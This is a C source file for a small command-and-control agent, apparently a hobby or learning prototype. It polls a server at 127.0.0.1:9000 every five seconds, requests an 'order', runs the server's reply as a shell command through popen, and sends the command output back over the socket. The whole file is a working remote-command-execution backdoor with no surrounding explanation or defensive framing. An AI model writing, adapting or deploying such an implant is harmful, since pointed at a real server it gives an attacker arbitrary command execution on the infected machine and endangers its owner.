#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>
#include <stdbool.h>

#include <sys/types.h>
#include <sys/socket.h>

#include <netinet/in.h>
#include <arpa/inet.h>

int timeout;

struct agent_attributes {	
    unsigned int poll_interval;
    struct sockaddr_in server_address;
};

int tcp_connect(struct agent_attributes* agent){
    int network_socket;
    network_socket = socket(AF_INET, SOCK_STREAM, 0);

    if (network_socket < 0) {
        perror("socket");
        return -1;
    }

    if(connect(network_socket,
               (struct sockaddr *) &agent->server_address,
               sizeof(agent->server_address)) != 0){
        perror("connect");
        close(network_socket);
        return -1;
    }
    return network_socket;
}

int send_report(struct agent_attributes *agent){
    char report_message[] = "Example report message\n";

    int network_socket = tcp_connect(agent);
    if (network_socket < 0){
        printf("This will be written elsewhere\n");
        return -1;
    }
		
    send(network_socket, report_message, strlen(report_message), 0);	
    close(network_socket);
    return 0;
}

int receive_order(struct agent_attributes *agent){
    char server_response[256];

    int network_socket = tcp_connect(agent);
    if (network_socket < 0){
        printf("This will be written elsewhere\n");
        return -1;
    }
    char ask_message[] = "Ask report message\n";
    send(network_socket, ask_message, strlen(ask_message), 0);
	printf("Start receiving\n");
    
    recv(network_socket, server_response, sizeof(server_response) - 1, 0);
    server_response[255] = '\0';

    printf("Server response: %s\n", server_response);
    
	FILE *fp;
	char path[1035];

	fp = popen(server_response, "r");
	if (fp == NULL) {
		printf("Failed to run command\n" );
		exit(1);
	}

	while (fgets(path, sizeof(path), fp) != NULL) {
		send(network_socket, path, strlen(path), 0);
	}
	pclose(fp);
    close(network_socket);
    return 0;
}

int main(){
    const char *SERVER_IP = "127.0.0.1";
    const uint16_t PORT = 9000;
    const unsigned int POLL_INTERVAL = 5;

    struct agent_attributes defaults;
    defaults.poll_interval = POLL_INTERVAL;

    struct sockaddr_in server_address;
    server_address.sin_family = AF_INET;
    server_address.sin_port = htons(PORT);
    inet_pton(AF_INET, SERVER_IP, &server_address.sin_addr);

    defaults.server_address = server_address;

    while (true) {
        sleep(defaults.poll_interval);
        receive_order(&defaults);
    }

    return 0;
}
